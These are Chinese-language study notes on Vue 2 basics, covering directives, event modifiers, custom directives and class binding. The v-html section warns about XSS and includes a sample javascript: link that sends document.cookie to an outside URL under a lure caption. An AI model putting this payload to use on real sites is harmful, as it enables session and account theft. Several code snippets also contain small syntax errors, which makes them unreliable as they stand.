# 概念：

​    VUE 是前端的框架，是用来简化JavaScript 代码编写的。(用来免除原生JavaScript中的DOM操作)

​     Vue：基于MVVM(Model-View-View-Model思想，实现数据的双向绑定，将编程的关注点放在数据上。

Charts: 报表图

## Vue2官网使用指南：

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/vue%E5%AE%98%E7%BD%91%E6%8C%87%E5%8D%97.png)



浏览器-强制刷新：shift+(点击)刷新 （强制刷新会查询当前网页的图标）

## 去Vue提示：

​    安装Vue插件<Root>点击不了的：数据不能用纯中文...

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E5%8E%BB%E6%8E%89Vue%E6%8F%90%E7%A4%BA.png)

## Vue的特点：

1.  遵循 **MVVM** 模式 。
2.  编码简洁, 体积小, 运行效率高, 适合移动/PC 端开发。
3.  它本身只关注 UI, 也可以引入其它第三方库开发项目。

## 与其它 JS 框架的关联：

1.  借鉴 Angular 的**模板**和**数据绑定**技术。
2.  借鉴 React 的**组件化**和**虚拟 DOM** 技术 

## **MVVM**  和**MVC**的区别：

### MVVM:

1. M：模型(Model) ：对应 data 中的数据 。
2. V：视图(View) ：模板 。
3. VM：视图模型(ViewModel) ： Vue 实例对象。

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/3.png)



#### MVVM模型对应代码:

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/MVVM%E6%A8%A1%E5%9E%8B%E5%AF%B9%E5%BA%94%E4%BB%A3%E7%A0%81.png)



### MVC:

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/1.png)

​      C：js 代码；     M ：数据；        V ：页面上展示的内容

## VsCode插件：

代码提示：

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/Vue3Snippets%E6%8F%92%E4%BB%B6.png)

# Vue的基本使用：

1.在HTML中，引入 Vue.js文件

```html
<script src="js/vue.js"></script> 

// 强制刷新
this.$forceUpdate();
```

2.在js里使用：

~~~html
<!DOCTYPE html>
<html lang="en"> 
    <head>
        <meta charset="UTF-8">
        <title>Title</title>
    </head>
    <body> 
        <div id="app"> 
            <!-- 2.在表单元素上创建 双向数据绑定-->
            <input v-model="username">
            {{username}}  <!--插值表达式-->
        </div> 
        <script src="js/vue.js"></script> 
        <script> 
            //3. 创建Vue核心对象 
            new Vue({ 
                el:"#app",
                data(){// 数据区： data()是ECMAScript 6 版本的新的写法 
                    return {
                        username:"" 
                    } 
                },
                created() { //钩子函数，VUE对象初始化完成后自动执行
                    this.getAll();
                },
                methods: {  // 方法定义区
                    getAll(){ //查询所有-分页查询方法....
                        axios.get().then((res) => { //get请求
                        }   }  }
                    /*data: function () { return { username:"" } }*/ 
                    ); 
        </script>
    </body> 
</html>
~~~

# Vue配置：

## data的两种写法：

1. 对象式：

2. 函数式：

   注意： 由Vue管理的函数，一定不要写箭头函数,一旦写了箭头函数，this就不再是Vue实例了。

```html
   <script>
        const vm = new Vue({
            el: "#root",
            data: {     // data的第一种写法：对象式
                name: "data的第一种写法：对象式"
            }
        })

        const vm2 = new Vue({
            el: "#root2",
            // data的第二种写法：函数式
            /*   data: function () {
                  console.log('@@@',this); //此处的this是Vue实例对象
                  return {
                      name: "尚硅谷"
                  }
              } */

            data() {  // data的第二种写法：函数式简写后
                return {
                    name: "data的第二种写法：函数式-简写"
                }
            }
        })
```



## el的两种写法：

​       ①.new Vue时候配置el属性。

​       ②.先创建Vue实例，随后在通过vm.$mount("#root")指定el的值。

```html
<div id="root">
    <h1>你好,{{name}}</h1>
</div>

<div id="root2">
    <h1>你好,{{name}}</h1>
</div>
<script>
    //  el的两种写法-方法1：
    new Vue({
        el: "#root",
        data: {
            name: "张楚岚"
        }
    })

    //  el的两种写法-方法2：
    const vm = new Vue({
        data: {
            name: "张楚岚2"
        }
    })
    setTimeout(() => {  //1秒定时器
        vm.$mount("#root2");
    }, 1000);
</script>
```

## template配置:

```html
<div id="root" :x="n">
    <!--  方式1：  -->
    <!--   <h3>当前n的值是:{{n}}</h3>
           <button @click="n++">点击n+1</button> -->
</div>
<script src="../js/vue.js"></script>
<script>
    new Vue({
        el: '#root',
        /*  方式2： 注意：template配置外面必须有一层根元素/根标签，但不能是template标签。  */
        template: `<div> 
                      <h3>当前n的值是:{{n}}</h3>
                      <button @click="n++">点击n+1</button>
                   </div>`,
        data: {  // 数据区
            n: 1
        }
    })
</script>
```



# 模板语法：

## 插值语法：

   插件语法：用于解析标签体内容（data,props,computed）。

```html
 {{js表达式}}  <!--插值语法-->  
```

```html
<div id="root">  <!--  root容器里的代码被称为【Vue模板】 -->
    <!-- {{js表达式}}： 插件语法。     toUpperCase()：单词全大写。 
Date.now():获取当前时间戳 --> 
    <h3>你好，{{name}}</h3>
    <h3>{{name.toUpperCase()}} ===》插值语法：解析函数</h3>
    <h3>{{Date.now()}} ===》 插值语法：获取当前时间戳</h3>
    </h3> 
</div>
<script src="../js/vue.js"></script>
<script>
    Vue.config.productionTip = false; //阻止 vue 在启动时生成生产提示。
    new Vue({
        el: "#root",
        data: {
            name: "Vue",
        }
    })
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E6%8F%92%E5%80%BC%E8%AF%AD%E6%B3%95.png)



## Vue**指令**：

### 结论：

   **指令：**HTML 标签上带有 v- 前缀的特殊属性（指令：以 v- 开头）。

​    指令功能：用于解析标签（包括：标签属性、标签体内容、绑定事件）。

   v-bind: 当js表达式解析。

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/Vue%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4.png)

### v-bind:

   单向数据绑定-特点：数据只能从data流向页面。

   语法：

   ```js
v-bind:href="xxx"  ==> 简写为 :href="xxx"
   ```

#### 默认写法-简写：

```vue
<div id="root">  
    <a v-bind:href="school.url">点击跳转{{school.name}} ==默认</a>   <br /> 
    <a  :href="school.url.toUpperCase()">点击跳转{{school.name}},路径大写 ==》简写</a><br />
    <input type="text" :value="school.name">v-bind:简写</input>
</div>
<script>
    new Vue({
        el: "#root",
        data: {
            school: {
                name: "尚硅谷",
                url: "http://www.atguigu.com",
            }
        }
    })
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/v-bind%E6%8C%87%E4%BB%A4.png)





### v-model:

  双向数据绑定-特点：数据不仅能从data流向页面，还能从页面流向data。

#### v-model:

语法：

```js
 v-model:value="xxx"  简写为 ==》 v-model="name"
```

```vue
<div id="root">
  双向数据绑定: <input type="text" v-model:value="name">
  双向数据绑定-简写(v-model): <input type="text" v-model="name">
</div>
<script>
        new Vue({
            el: "#root",
            data: {
                name: "尚硅谷s"
            }
        })
  </script>
```

#### 修饰符：

##### number:

```html
<div id="root">  <!-- number：把输入的东西装换为数字类型。
                      （只能输入数字类型，e字母除外） -->
    年龄:<input type="number" v-model.number="age">
</div>
<script>
        new Vue({
            el: '#root',
            data: {
                age: "",
            }
        })
    </script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/v-model%E2%80%94%E4%BF%AE%E9%A5%B0%E7%AC%A6-number.png)

##### lazy:

```html
<div id="root"> <!-- lazy: 失去焦点再收集数据 -->
    <textarea v-model.lazy="other" cols="30" rows="10"></textarea>
</div>
<script>
    new Vue({
        el: '#root',
        data: {
            age: "",
        }
    })
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/v-model%E2%80%94%E4%BF%AE%E9%A5%B0%E7%AC%A6-lazy.png)



##### trim:

```html
<div id="root">  <!-- trim: 去掉前后数据的空格 -->
   账号:<input type="text" v-model.trim="account">
</div>
<script>
    new Vue({
        el: '#root',
        data: {
            account: "",
        }
    })
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/v-model%E2%80%94%E4%BF%AE%E9%A5%B0%E7%AC%A6-trim.png)


### v-on:

​     1.使用v-on:xxx 或@xxx绑定事件，其中xxx是事件名。

​      2.事件的回调需要配置在methods对象中，最终会在vm上。

​      3.methods中配置的函数，不要用箭头函数！否则this就不是vm了。

​      4.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或组件实例对象。

​      5.@click="demo" 和@click="demo($event)"效果一致，但后者可以传参。

#### 事件：

```vue
@click ==>点击事件
@scroll  ==> 滚动条滚动事件
@wheel  ==>滚轮滚动事件
@keydown ==>键盘事件（按下键盘事件）
@keyup  ==>键盘事件（按下并抬起键盘事件）
```

##### @click：点击事件：

```html
<div id="root">
    <button v-on:click="showInfo">按钮</button>
    <button @click="showInfo">按钮</button> <!-- 简写后 -->
    <button @click="showInfo(666,$event)">按钮</button> <!-- 简写后2 -->
</div>
<script>
    new Vue({
        el: "#root",
        data:{
            name:"傲来国"
        },
        methods:{
            showInfo(event){ // event参数是Vue默认的传参。
                console.log(event.target) //获取点击按钮标签
                console.log(event.target.innerText) //获取点击按钮的Text
            },
            //event参数是Vue默认的传参，若传参会把Vue默认的传参覆盖掉。
            showInfo2(number,event){  
                console.log(number,event);
            }
        }
    })
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/@click%E7%82%B9%E5%87%BB%E4%BA%8B%E4%BB%B6.png)

##### 滚动条滚动事件：

```
@scroll  ==> 滚动条滚动事件
@wheel  ==>滚轮滚动事件
```

###### @scroll (滚动条滚动事件):

```vue
<div id="root">
    <ul @scroll="scrollBar" class="list">
        <!-- @scroll ==> 滚动条滚动事件 -->
        <li>1</li>
        <li>2</li>
        <li>3</li>
        <li>4</li>
    </ul>
</div>
<script>
    new Vue({
        el: "#root",
        methods:{
            scrollBar() {
                for (let i = 0; i < 1000; i++) {
                    console.log("@");
                }
                console.log("累坏了");
            }
        }
    })
</script>
```



###### @wheel(滚轮滚动事件):

```vue
<div id="root">
    <ul @wheel="scrollBar" class="list">
        <li>1</li>
        <li>2</li>
        <li>3</li>
        <li>4</li>
    </ul>
</div>
<script>
    new Vue({
        el: "#root",
        methods:{
            scrollBar() {
                for (let i = 0; i < 1000; i++) {
                    console.log("@");
                }
                console.log("累坏了");
            }
        }
    })
</script>
```



##### 键盘事件：

```html
@keydown ==>键盘事件（按下键盘事件）
@keyup  ==>键盘事件（按下并抬起键盘事件）
```

```js
注意:按键别名也可续写,'.'连接多个键盘名.例@keyup.enter.tab="showInfo"。 
   1.Vue中常用的按键别名： 
##### 键盘事件：
    1.Vue中常用的按键别名：
         回车 => enter
         删除 => delete(“删除”和“退格”键)
         退出 => esc
         空格 => space
         换行 => tab (必须配合@keydown使用)
         上 => up
         下 => down
         左 => left
         右 => right
     2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case(短横线命名)
     3.系统修饰键(用法特殊)：ctrl、alt、shift、meta(win键)   (按键别名也可续写)
        ①配合keyup使用：按下修饰符键的同时，再按下其他键，随后释放其他键，事件才被触发。
        ②配合keydown使用：正常触发事件。
     4.也可以使用keyCode去指定具体的按键（不推荐）
     5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
```

###### Vue中常用的按键别名:

```html
<div id="root">
    <h5>1.Vue中常用的按键别名: </h5>  <!-- 回车 => enter -->
    <input type="text" placeholder="按下回车提示输入键" @keyup.enter="showInfo">
</div>
<script>
    new Vue({
        el: '#root',
        methods: {
            showInfo(e) {
                console.log(e.target.value); //获取输入框数据
                console.log(e.key, e.keyCode); //获取键盘名 和键盘码
            }
        }
    })
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6-Vue%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8C%89%E9%94%AE%E5%88%AB%E5%90%8D.png)



###### Vue未提供别名的按键:

```html
<div id="root">
    <h5>2.Vue未提供别名的按键,可以使用按键原始的key值去绑定,但注意要转为kebab-case(短横线命名)</h5>
    <!-- 多个单词拼写的要转小写，并使用-分割。
例：CapsLock（切换大小写键） ==》@keydown.caps-lock  -->
    <input type="text" placeholder="按下回车提示输入键" @keydown.caps-lock="showInfo">
</div>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6-Vue%E6%9C%AA%E6%8F%90%E4%BE%9B%E5%88%AB%E5%90%8D%E7%9A%84%E6%8C%89%E9%94%AE.png)



###### 系统修饰键(特殊):

系统修饰键(用法特殊): ctrl、alt、shift、meta(win键)

```html
<div id="root">
    <h5>3.系统修饰键(用法特殊): ctrl、alt、shift、meta(win键) </h5>
    <input type="text" placeholder="按下回车提示输入键" @keydown.ctrl="showInfo">
    <!-- <input type="text" placeholder="按下回车提示输入键" @keyup.ctrl.y="showInfo"> -->
</div>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6-%E7%B3%BB%E7%BB%9F%E4%BF%AE%E9%A5%B0%E9%94%AE.png)



###### 使用keyCode去指定具体的按键:   （Vue3移除）

```html
<div id="root">
    <h5> 4.也可以使用keyCode去指定具体的按键(不推荐) </h5>
    <!--回车键键盘码为：13 -->
    <input type="text" placeholder="按下回车提示输入键" @keydown.13="showInfo">
</div>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6-%E4%BD%BF%E7%94%A8keyCode%E5%8E%BB%E6%8C%87%E5%AE%9A%E5%85%B7%E4%BD%93%E7%9A%84%E6%8C%89%E9%94%AE.png)

###### 自定义键名：

```html
<div id="root">
    <h5>5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名。</h5>
    <input type="text" placeholder="按下回车提示输入键" @keydown.huiche="showInfo">
</div>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6-%E8%87%AA%E5%AE%9A%E4%B9%89%E9%94%AE%E5%90%8D.png)

#### 事件修饰符：

​     注意：修饰符可连续写。

```js
1.prevent:  阻止默认事件（常用）
2.stop:  阻止事件冒泡（常用）
3.once: 事件只触发一次（常用）
4.capture: 使用事件的捕获模式。  捕获阶段从外往内，冒泡阶段从内往外(默认) 
5.self: 只有event.target是当前操作的元素时才触发事件。
6.passive:  事件的默认行为立即执行，无需等待事件回调执行完毕。
```

##### prevent：

```html
<div id="root">
        <h1>欢迎来到{{name}}学习</h1>
  <!-- prevent: 阻止默认事件 （a标签的默认行为：点击跳转到指定路径） -->
        <a href="https://www.baidu.com/" @click.prevent="showInfo">按钮</a>
    </div>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E4%BA%8B%E4%BB%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6-prevent.png)

##### stop:

```html
 <div id="root">
        <!--  stop:  阻止事件冒泡 -->
        <div class="demo1" @click="showInfo">
            <button @click.stop="showInfo">按钮2</button>

            <!--  阻止事件冒泡并阻止默认事件（修饰符可连续写） -->
            <!-- <a  href="https://www.baidu.com/" @click.stop.prevent="showInfo">按钮2</a> -->
        </div>
    </div>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E4%BA%8B%E4%BB%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6-stop.png)

##### once 修饰符:

```html
<div id="root">
    <!-- : 事件只触发一次 -->
    <button @click.once="showInfo">按钮3</button>
</div>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E4%BA%8B%E4%BB%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6-once.png)

##### capture:

```html
<!-- capture: 使用事件的捕获模式（ 捕获阶段从外往内，冒泡阶段从内往外（默认）） -->
<div class="box1" @click.capture="showMsg(1)">
    div1
    <div class="box2" @click="showMsg(2)">div2</div>
</div>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E4%BA%8B%E4%BB%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6-capture.png)

##### self:

```html
   <div id="root">
         <!--  self: 只有event.target是当前操作的元素时才触发事件 -->
         <div class="demo1" @click.self="showSelf">
            <button @click="showSelf">按钮3</button>
        </div>
    </div>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E4%BA%8B%E4%BB%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6-self.png)

##### passive:

```html
<div id="root">
        <!--  passive:  事件的默认行为立即执行，无需等待事件回调执行完毕 (移动端常用：手机，平板) -->
        <ul @wheel.passive="scrollBar" class="list">
            <!-- @wheel==> 滚轮滚动事件 -->
            <!-- @scroll ==> 滚动条滚动事件 -->
            <li>1</li>
            <li>2</li>
            <li>3</li>
            <li>4</li>
        </ul>
    </div>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E4%BA%8B%E4%BB%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6-passive.png)



### v-show:

```js
 写法：v-show='表达式'
          适用于：切换频率较高的场景。
          特点：不展示的DOM元素为被移除，仅仅是使用样式隐藏掉。
        3.备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。
```

```html
<div id="root">
    <h3 v-show="n == 1">Angular</h3>
    <h3 v-show="n == 2">React</h3>
    <h3 v-show="n == 3">Vue</h3>
</div>
```


![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/v-show%E6%8C%87%E4%BB%A4.png)



### v-if、v-else-if、v-else和 template标签:

```html
写法：
  ①v-if='表达式'
  ②v-else-if='表达式'
  ③v-else='表达式'
适用于：切换频率较低的场景。
特点：不展示的DOM元素直接被移除。
注意：v-if可以和v-else-if、v-else一起使用，但要求结构不能别其他标签"打断" 
```

```html
<div id="root">
    <h3 v-if="n == 1 ">Angular</h3>
    <h3 v-else-if="n == 2">React</h3>
    <h3 v-else="n == 3">Vue</h3>
</div>

<!-- template标签不影响原来的结构。注意：template只能配合v-if使用，不能配合v-show使用 -->
<template v-if="n ==1">
    <h2>张三</h2>
    <h2>男</h2>
    <h2>23</h2>
</template>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/v-if%E3%80%81v-else-if%E3%80%81v-else%E4%B8%8Etemplate%E6%A0%87%E7%AD%BE.png)





### v-for:

​    1.用于展示列表数据。
​    2.语法1：v-for=''val on xxx"  :key="yyyy"  或v-for="val of xxx"  :key="yyyy"
​    2.语法2：v-for=(item,index) in xxx  :key="yyyy"
​    3.可遍历：数组、对象、字符串、指定次数。
​     key的原理：虚拟DOM的对比算法   ==>  diff算法。 
​     注意：vue中默认使用的key值就是索引值。

#### 遍历数组：

```html
<!--方式1 -->
<div v-for="p on personList" :key="p.id">
    {{p.name}} - {{p.age}}
</div>

<!--方式2 -->
<ul>  <!-- p:为数据   key:为索引-->
    <li v-for="(p,key) in personList" :key="key">
        {{key}} --{{p.name}}
    </li>
</ul>
<script src="../js/vue.js"></script>
<script>
    new Vue({ /*1.创建Vue核心对象*/
        el: "#app",
        data: {
            personList: [
                { id: '001', name: '张三', age: 20 },
                { id: '002', name: '李四', age: 21 },
                { id: '003', name: '王五', age: 24 },
            ]
        }
    })
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/v-for_%E9%81%8D%E5%8E%86%E6%95%B0%E7%BB%84.png)

#### 遍历对象：

```html
<ul>  <!-- value:为数据   key:为索引-->
    <li v-for="(value,key) in car" :key="key">
        {{key}} --{{value}}
    </li>
</ul><script src="../js/vue.js"></script>
<script>
    new Vue({/*1.创建Vue核心对象*/
        el: "#app",
        data: {
            car: {
                name: "奥迪双钻",
                price: "100万",
                color: "黑色"
            }
        }
    })
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/v-for_%E9%81%8D%E5%8E%86%E5%AF%B9%E8%B1%A1.png)

#### 遍历字符串：

```html
<ul>
    <li v-for="(char,key) in str" :key="key">
        {{key}} --{{char}}
    </li>
</ul><script src="../js/vue.js"></script>
<script>
    new Vue({ /*1.创建Vue核心对象*/
        el: "#app",
        data: {
            str: 'hello'
        }
    })
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/v-for_%E9%81%8D%E5%8E%86%E5%AD%97%E7%AC%A6%E4%B8%B2.png)

#### 遍历次数：

```html
<div id="app">
    <h2>遍历指定次数</h2>
    <ul>   <!-- char:为数据   key:为索引-->
        <li v-for="(char,key) in 5" :key="key">
            {{key}} --{{char}}
        </li>
    </ul>
</div>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/v-for_%E9%81%8D%E5%8E%86%E5%AD%97%E7%AC%A6%E4%B8%B2.png)



### v-text:

​     1.作用：向其所在的节点中渲染文本内容，但不渲染里面的标签。

​       2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。

```html
<div id="root">
    <div v-text="name"></div>
    <div v-text="str"></div>
</div>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/v-text.png)

### v-html:

​     1.作用：向指定节点中渲染包含html结构的内容。
​      2.与插值语法的区别：
​             ①.v-html会替换掉节点中所有的内容，{{xx}}则不会。
​             ②.v-html可以识别html结构。
​     3.严重注意：v-html有安全性问题！！！！
​             ①.在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
​             ②.一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！

```html
<div id="root">
    <div v-html="str"></div>
    <div v-html="str2"></div>
</div>
<script type="text/javascript" src="../js/vue.js"></script>
<script type="text/javascript">
    new Vue({
        el:'#root',
        data:{
            str:'<h3>你好啊！</h3>',
            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>', //可通过获取的cookies盗取账号
        }
    })
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/v-html.png)



### v-cloak:

v-cloak指令（没有值）：
​            1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
​            2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。

```html
<style>
    [v-cloak]{
        display:none;
    }
</style>
<body>
    <div id="root">
        <h2 v-cloak>{{name}}</h2>
    </div>
    <script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script> <!--等10秒在加载Vue -->
</body>
<script src="../js/vue.js"></script>
<script type="text/javascript">
    console.log(1)
    new Vue({
        el:'#root',
        data:{
            name:'尚硅谷'
        }
    })
</script>
```

### v-once:

①v-once所在节点在初次动态渲染后，就视为静态内容了。
②以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```html
<div id="root">
    <h2 v-once>初始化的n值是:{{n}}</h2>
    <h2>当前的n值是:{{n}}</h2>
    <button @click="n++">点我n+1</button>
</div><script src="../js/vue.js"></script>
<script type="text/javascript">
    new Vue({
        el:'#root',
        data:{
            n:1
        }
    })
</script>
```



### v-pre:

​          1.跳过其所在节点的编译过程。
​          2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

```html
<div id="root">
    <h2 v-pre>Vue其实很简单</h2>
    <h2 >当前的n值是:{{n}}</h2>
    <button @click="n++">点我n+1</button>
</div>
```



### 自定义指令：

#### 全局指令：

##### 函数：

```html
<div id="root">
    <h3 v-big2="n"></h3>
</div>
<div id="root2">
    <h3 v-big2="n"></h3>
</div>
<script>
    //定义全局指令-函数 (必须在new Vue之前定义)
    Vue.directive('big2', function (element, binding) { //自定义指令-函数   参数：真实DOM,绑定对象
        element.innerText = binding.value;
    })
    new Vue({
        el: '#root',
        data: {
            name: "尚硅谷",
            n: 1,
        },    
    })
    new Vue({
        el: "#root2",
        data: {
            n: 2
        }
    })</script>
```



##### 对象：

```html
<div id="root">
    <input  type="text" v-fbind2.value="n"></input>
</div>
<div id="root2">
    <input  type="text" v-fbind2.value="n"></input>
</div>
<script>
    //定义全局指令-对象 (必须在new Vue之前定义)
    Vue.directive('fbind2', {
        bind(element, binding) {
            element.value = binding.value * 10;
        },
        /* inserted函数何时会被调用？指令所在元素被插入页面时 */
        inserted(element, binding) {
            element.focus(); //获取焦点
        },
        /* update函数何时会被调用？指令所在元素被重新解析时 */
        update(element, binding) {
            // console.log('update')
            element.value = binding.value * 10;
        }
    })
    new Vue({
        el: '#root',
        data: {
            name: "尚硅谷",
            n: 1,
        },    
    })
    new Vue({
        el: "#root2",
        data: {
            n: 2
        }
    })</script> 
```


#### 局部指令：

##### 函数：

###### 单个字段：

```html
<div id="root">
    <h3>{{name}}</h3>
    <h3>当前的n值是: <span v-text="n"></span></h3>
    <h3>放大10倍的n值是: <span v-big="n"></span></h3>
    <button @click="n++">点击n+1</button>
</div>
<script src="../js/vue.js"></script>
<script>
    new Vue({
        el: '#root',
        data: {
            name: "尚硅谷",
            n: 1,
        },
        directives: { //自定义指令： 1.函数   2.对象
            // big函数何时会被调用？1.指令与元素成功绑定时。2.指令所在的模板被重新解析时。
            big(element, binding) { //自定义指令-函数   参数：真实DOM,绑定对象
                console.log('big', this); // 注意：所有自定义指令的this指向的都是windon。
                console.dir(element, binding) // console.dir()可以显示一个对象所有的属性和方法

                element.innerText = binding.value * 10;
            }
        })
</script>
```

###### 多个字段：

```html
<div id="root">
    <h3>{{name}}</h3>
    <h3>当前的n值是: <span v-text="n"></span></h3>
    <h3>放大10倍的n值是: <span v-big-number="n"></span></h3>
    <button @click="n++">点击n+1</button>
</div>
<script src="../js/vue.js"></script>
<script>
    new Vue({
        el: '#root',
        data: {
            name: "尚硅谷",
            n: 1,
        },
        directives: { //自定义指令： 1.函数   2.对象
            // big-number函数何时会被调用？1.指令与元素成功绑定时。2.指令所在的模板被重新解析时。
            'big-number'(element, binding) { //自定义指令-函数_多个字段
                // console.dir(element, binding) // console.dir()可以显示一个对象所有的属性和方法
                element.innerText = binding.value * 10;
            },
        })
</script>
```





##### 对象：

```html
<div id="root">
    <h3>当前的n值是:{{n}}</h3>
    <input type="text" v-fbind:value="n">
    <button @click="n++">点击n+1</button>
</div>
<script src="../js/vue.js"></script>
<script>
    new Vue({
        el: '#root',
        data: {
            name: "尚硅谷",
            n: 1,
        },
        directives: { //自定义指令： 1.函数   2.对象
            // fbind函数何时会被调用？1.指令与元素成功绑定时。2.指令所在的模板被重新解析时。
            fbind: { // 自定义指令-对象
                /* bind函数何时会被调用？ 指令与元素成功绑定时 */
                bind(element, binding) {
                    // console.log('bind')
                    element.value = binding.value;
                },
                /* inserted函数何时会被调用？指令所在元素被插入页面时 */
                inserted(element, binding) {
                    console.log('bind')
                    element.focus(); //获取焦点
                },
                /* update函数何时会被调用？指令所在元素被重新解析时 */
                update(element, binding) {
                    console.log('update')
                    element.value = binding.value;
                }
            }
        })
</script>
```



## v-bind与v-model的区别：

```html
<div id="root">
    <h2> v-bind与v-model的区别:</h2>
    <h3 v-bind:x="name">你好啊(v-bind)</h3> 
    <h3 v-model:x="name">你好啊(v-model)</h3> <!-- 报错==> Error compiling template -->
</div>
<script>
    new Vue({
        el: "#root",
        data: {
            name: "尚硅谷s"
        }
    })
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/v-bind%E4%B8%8Ev-model%E7%9A%84%E5%8C%BA%E5%88%AB.png)

# 绑定Css样式：

​    绑定样式:使用v-bind绑定样式,多个单词使用小驼峰拼接。

## class:

###### 字符串:

   适用于：样式的类名不确定，需要动态指定。

```html
<style> /*  三种心情，只能单选：心情一般，高兴，不高兴 */
    .normal {
        /* 心情一般 */
        background-color: skyblue;
    }
</style>
<div id="root">
    <h2>绑定clss样式--字符串，数组，对象写法</h2>
    <div class="basic" :class="classMood" @click="changeMood">字符串写法</div> <br />
</div>
<script src="../js/vue.js"></script>
<script>
    new Vue({
        el: "#root",
        data: {
            classMood: "normal", //心情数组-心情一般
            classArr: ['atguigu1', 'atguigu2', 'atguigu3'],
        }
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%BB%91%E5%AE%9Acss%E6%A0%B7%E5%BC%8F-%E5%AD%97%E7%AC%A6%E4%B8%B2.png)

###### 数组:

